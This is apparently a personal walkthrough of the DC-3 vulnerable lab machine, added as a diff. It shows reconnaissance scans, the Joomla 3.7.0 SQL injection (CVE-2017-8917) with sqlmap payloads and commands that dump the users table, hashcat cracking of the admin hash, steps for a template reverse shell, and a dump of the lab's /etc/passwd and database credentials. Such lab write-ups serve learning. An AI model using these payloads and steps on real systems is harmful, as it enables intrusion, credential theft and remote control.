@@ -1,0 +1,302 @@
+ip   192.168.56.139
+
+nmap 
+
+
+Nmap scan report for 192.168.56.139
+Host is up (0.00049s latency).
+Not shown: 65534 closed ports
+PORT   STATE SERVICE VERSION
+80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
+|_http-generator: Joomla! - Open Source Content Management
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+|_http-title: Home
+MAC Address: 08:00:27:1C:53:6A (Oracle VirtualBox virtual NIC)
+Device type: general purpose
+Running: Linux 3.X|4.X
+OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
+OS details: Linux 3.2 - 4.9
+Network Distance: 1 hop
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.49 ms 192.168.56.139
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 17.39 seconds
+
+
+
+
+
+root@saim:~/Desktop/.machine/dc-3# whatweb 192.168.56.139
+http://192.168.56.139 [200 OK] Apache[2.4.18], Cookies[460ada11b31d3c5e5ca6e58fd5d3de27], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.18 (Ubuntu)], HttpOnly[460ada11b31d3c5e5ca6e58fd5d3de27], IP[192.168.56.139], JQuery, MetaGenerator[Joomla! - Open Source Content Management], PasswordField[password], Script[application/json], Title[Home]
+root@saim:~/Desktop/.machine/dc-3# 
+
+
+
+Nikt result
++ Server: Apache/2.4.18 (Ubuntu)
++ The anti-clickjacking X-Frame-Options header is not present.
++ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
++ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
++ Apache/2.4.18 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
++ IP address found in the 'location' header. The IP is "127.0.1.1".
++ OSVDB-630: The web server may reveal its internal or real IP in the Location header via a request to /images over HTTP/1.0. The value is "127.0.1.1".
++ Web Server returns a valid response with junk HTTP methods, this may cause false positives.
++ DEBUG HTTP verb may show server debugging information. See http://msdn.microsoft.com/en-us/library/e8z01xdh%28VS.80%29.aspx for details.
++ OSVDB-8193: /index.php?module=ew_filemanager&type=admin&func=manager&pathext=../../../etc: EW FileManager for PostNuke allows arbitrary file retrieval.
++ OSVDB-3092: /administrator/: This might be interesting...
++ OSVDB-3092: /bin/: This might be interesting...
++ OSVDB-3092: /includes/: This might be interesting...
++ OSVDB-3092: /tmp/: This might be interesting...
++ OSVDB-3092: /LICENSE.txt: License file found may identify site software.
++ OSVDB-3233: /icons/README: Apache default file found.
++ /htaccess.txt: Default Joomla! htaccess.txt file found. This should be removed or renamed.
++ /administrator/index.php: Admin login page/section found.
++ 8726 requests: 0 error(s) and 17 item(s) reported on remote host
++ End Time:           2020-04-25 14:31:35 (GMT5.5) (173 seconds)
+---------------------------------------------------------------------------
++ 1 host(s) tested
+
+
+i used dirb to broutforce the directories
+and it's help me to find the dir
+
+firstly i just use google to know directory structure of the joomla and how can i find the version of this cms....
+
+http://192.168.56.139/administrator/language/en-GB/en-GB.xml
+
+here i got the version of the joomla
+<metafile version="3.7" client="administrator"><name>English (en-GB)</name><version>3.7.0</version><creationDate>April 2017</creationDate><author>Joomla! Project</author><authorEmail>admin@joomla.org</authorEmail><authorUrl>www.joomla.org</authorUrl><copyright>Copyright (C) 2005 - 2017 Open Source Matters. All rights reserved.</copyright>
+
+
+
+
+# Exploit Title: Joomla 3.7.0 - Sql Injection
+# Date: 05-19-2017
+# Exploit Author: Mateus Lino
+# Reference: https://blog.sucuri.net/2017/05/sql-injection-vulnerability-joomla-3-7.html
+# Vendor Homepage: https://www.joomla.org/
+# Version: = 3.7.0
+# Tested on: Win, Kali Linux x64, Ubuntu, Manjaro and Arch Linux
+# CVE : - CVE-2017-8917
+
+
+URL Vulnerable: http://localhost/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml%27
+
+
+Using Sqlmap: 
+
+sqlmap -u "http://localhost/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent --dbs -p list[fullordering]
+
+
+Parameter: list[fullordering] (GET)
+    Type: boolean-based blind
+    Title: Boolean-based blind - Parameter replace (DUAL)
+    Payload: option=com_fields&view=fields&layout=modal&list[fullordering]=(CASE WHEN (1573=1573) THEN 1573 ELSE 1573*(SELECT 1573 FROM DUAL UNION SELECT 9674 FROM DUAL) END)
+
+    Type: error-based
+    Title: MySQL >= 5.0 error-based - Parameter replace (FLOOR)
+    Payload: option=com_fields&view=fields&layout=modal&list[fullordering]=(SELECT 6600 FROM(SELECT COUNT(*),CONCAT(0x7171767071,(SELECT (ELT(6600=6600,1))),0x716a707671,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 time-based blind - Parameter replace (substraction)
+    Payload: option=com_fields&view=fields&layout=modal&list[fullordering]=(SELECT * FROM (SELECT(SLEEP(5)))GDiu)
+            
+
+sqlmap -u "http://192.168.56.139/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent --dbs -p list[fullordering]
+
+
+to see the db
+
+  sqlmap -u "http://192.168.56.139/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent -D joomladb 
+
+
+sqlmap -u "http://192.168.56.139/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent -D joomladb -T '#__users' -C id,name,username,email,password,usertype,block,sendEmail,registerDate,lastvisitDate,activation,params --dump
+
+
+
+then i got the hash of the db users
+
+
+
+[11:24:19] [INFO] the back-end DBMS is MySQL
+back-end DBMS: MySQL >= 5.1
+[11:24:19] [INFO] fetching entries of column(s) '`id`, `name`, `password`, activation, block, email, lastvisitDate, params, registerDate, sendEmail, username, usertype' for table '#__users' in database 'joomladb'
+[11:24:19] [INFO] retrieved: '629'
+[11:24:19] [INFO] retrieved: 'admin'
+[11:24:20] [INFO] retrieved: '$2y$10$DpfpYjADpejngxNh9GnmCeyIHCWpL97CVRnGeZsVJwR0k...
+[11:24:20] [INFO] retrieved: '0'
+[11:24:20] [INFO] retrieved: '0'
+[11:24:21] [INFO] retrieved: 'freddy@norealaddress.net'
+[11:24:21] [INFO] retrieved: '2019-03-25 12:59:30'
+[11:24:21] [INFO] retrieved: '{"admin_style":"","admin_language":"","language":"",...
+[11:24:22] [INFO] retrieved: '2019-03-23 09:44:38'
+[11:24:22] [INFO] retrieved: '1'
+[11:24:22] [INFO] retrieved: 'admin'
+Database: joomladb
+Table: #__users
+[1 entry]
++------+--------+--------------------------------------------------------------+----------+--------------------------+----------+-------+-----------+---------------------+---------------------+------------+----------------------------------------------------------------------------------------------+
+| id   | name   | password                                                     | username | email                    | usertype | block | sendEmail | registerDate        | lastvisitDate       | activation | params                                                                                       |
++------+--------+--------------------------------------------------------------+----------+--------------------------+----------+-------+-----------+---------------------+---------------------+------------+----------------------------------------------------------------------------------------------+
+| 629  | admin  | $2y$10$DpfpYjADpejngxNh9GnmCeyIHCWpL97CVRnGeZsVJwR0kWFlfB1Zu | admin    | freddy@norealaddress.net |          | 0     | 1         | 2019-03-23 09:44:38 | 2019-03-25 12:59:30 | 0          | {"admin_style":"","admin_language":"","language":"","editor":"","helpsite":"","timezone":""} |
++------+--------+--------------------------------------------------------------+----------+--------------------------+----------+-------+-----------+---------------------+---------------------+------------+----------------------------------------------------------------------------------------------+
+
+[11:24:22] [INFO] table 'joomladb.`#__users`' dumped to CSV file '/root/.sqlmap/output/192.168.56.139/dump/joomladb/#__users.csv'
+[11:24:22] [WARNING] HTTP error codes detected during run:
+500 (Internal Server Error) - 21 times
+[11:24:22] [INFO] fetched data logged to text files under '/root/.sqlmap/output/192.168.56.139'
+
+[*] ending @ 11:24:22 /2020-05-10/
+
+
+now its time to crack the has so let's find the hash type
+
+
+hashid
+hash
+
+root@saimson:~/.sqlmap/output/192.168.56.139# hashid 
+$2y$10$DpfpYjADpejngxNh9GnmCeyIHCWpL97CVRnGeZsVJwR0kWFlfB1Zu
+Analyzing '$2y$10$DpfpYjADpejngxNh9GnmCeyIHCWpL97CVRnGeZsVJwR0kWFlfB1Zu'
+[+] Blowfish(OpenBSD) 
+[+] Woltlab Burning Board 4.x 
+[+] bcrypt 
+
+
+it will show you bcrypt type now check the
+-m value in haschcat
+
+hashcat --help | grep bcrypt
+3200
+
+  3200 | bcrypt $2*$, Blowfish (Unix)                     | Operating Systems
+
+
+
+now 
+
+
+root@saimson:~/Desktop/.machine/dc-3# hashcat -a 0 -m 3200 hash.txt /usr/share/wordlists/rockyou.txt --force
+hashcat (v5.1.0) starting...
+
+OpenCL Platform #1: The pocl project
+====================================
+* Device #1: pthread-Intel(R) Core(TM) i5-8250U CPU @ 1.60GHz, 2048/5891 MB allocatable, 8MCU
+
+Hashes: 1 digests; 1 unique digests, 1 unique salts
+Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
+Rules: 1
+
+Applicable optimizers:
+* Zero-Byte
+* Single-Hash
+* Single-Salt
+
+Minimum password length supported by kernel: 0
+Maximum password length supported by kernel: 72
+
+Watchdog: Hardware monitoring interface not found on your system.
+Watchdog: Temperature abort trigger disabled.
+
+* Device #1: build_opts '-cl-std=CL1.2 -I OpenCL -I /usr/share/hashcat/OpenCL -D LOCAL_MEM_TYPE=2 -D VENDOR_ID=64 -D CUDA_ARCH=0 -D AMD_ROCM=0 -D VECT_SIZE=8 -D DEVICE_TYPE=2 -D DGST_R0=0 -D DGST_R1=1 -D DGST_R2=2 -D DGST_R3=3 -D DGST_ELEM=6 -D KERN_TYPE=3200 -D _unroll'
+* Device #1: Kernel m03200-pure.ac730618.kernel not found in cache! Building may take a while...
+Dictionary cache hit:
+* Filename..: /usr/share/wordlists/rockyou.txt
+* Passwords.: 14344385
+* Bytes.....: 139921507
+* Keyspace..: 14344385
+
+$2y$10$DpfpYjADpejngxNh9GnmCeyIHCWpL97CVRnGeZsVJwR0kWFlfB1Zu:snoopy
+                                                 
+Session..........: hashcat
+Status...........: Cracked
+Hash.Type........: bcrypt $2*$, Blowfish (Unix)
+Hash.Target......: $2y$10$DpfpYjADpejngxNh9GnmCeyIHCWpL97CVRnGeZsVJwR0...lfB1Zu
+Time.Started.....: Sun May 10 11:58:21 2020 (7 secs)
+Time.Estimated...: Sun May 10 11:58:28 2020 (0 secs)
+Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
+Guess.Queue......: 1/1 (100.00%)
+Speed.#1.........:       41 H/s (9.24ms) @ Accel:4 Loops:2 Thr:8 Vec:8
+Recovered........: 1/1 (100.00%) Digests, 1/1 (100.00%) Salts
+Progress.........: 256/14344385 (0.00%)
+Rejected.........: 0/256 (0.00%)
+Restore.Point....: 0/14344385 (0.00%)
+Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:1022-1024
+Candidates.#1....: 123456 -> freedom
+
+Started: Sun May 10 11:57:49 2020
+Stopped: Sun May 10 11:58:29 2020
+root@saimson:~/Desktop/.machine/dc-3# 
+
+
+
+so now i have an user name - admin 
+and password - snoopy
+ lets log in
+
+ there is no ssh port so plz don't try to make the ssh connection
+
+
+to get reverse shell
+just goto extension >> templates>> index.php >> and paste the rverseshell >>and 
+nc 1234 to local 
+and preview
+you will get the shell
+
+$ cat /etc/passwd
+cat /etc/passwd
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
+systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
+systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
+systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
+syslog:x:104:108::/home/syslog:/bin/false
+_apt:x:105:65534::/nonexistent:/bin/false
+lxd:x:106:65534::/var/lib/lxd/:/bin/false
+mysql:x:107:111:MySQL Server,,,:/nonexistent:/bin/false
+messagebus:x:108:112::/var/run/dbus:/bin/false
+uuidd:x:109:113::/run/uuidd:/bin/false
+dnsmasq:x:110:65534:dnsmasq,,,:/var/lib/misc:/bin/false
+sshd:x:111:65534::/var/run/sshd:/usr/sbin/nologin
+dc3:x:1000:1000:dc3,,,:/home/dc3:/bin/bash
+$ 
+
+this is the conf.php in html mysql db pass
+
+public $dbtype = 'mysqli';
+	public $host = 'localhost';
+	public $user = 'root';
+	public $password = 'squires';
+	public $db = 'joomladb';
+	public $dbprefix = 'd8uea_';
+	public $live_site = '';
+	public $secret = '7M6S1HqGMvt1JYkY';
+	public $gzip = '0';
+	public $error_reporting = 'default';
+	public $helpurl = 'https://help.joomla.org/proxy/index.php?keyref=Help{major}{minor}:{keyref}';
+	public $ftp_host = '127.0.0.1';
+	public $ftp_port = '21';
+	public $ftp_user = '';
+	public $ftp_pass = '';
+	public $ftp_root = '';
+	public $ftp_enable = '0';
